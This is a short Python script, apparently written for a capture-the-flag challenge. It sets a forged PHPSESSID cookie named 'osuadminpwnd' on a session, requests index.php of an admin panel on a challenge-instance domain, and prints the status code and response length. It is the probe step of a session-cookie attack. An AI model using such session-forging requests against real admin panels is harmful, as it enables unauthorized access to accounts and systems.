import requests
BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
sess = requests.Session()
sess.cookies.set("PHPSESSID", "osuadminpwnd", domain="admin-panel-489a10b9570c.instancer.sekai.team", path="/")
r = sess.get(f"{BASE_URL}/index.php")
print(r.status_code)
print(len(r.text))
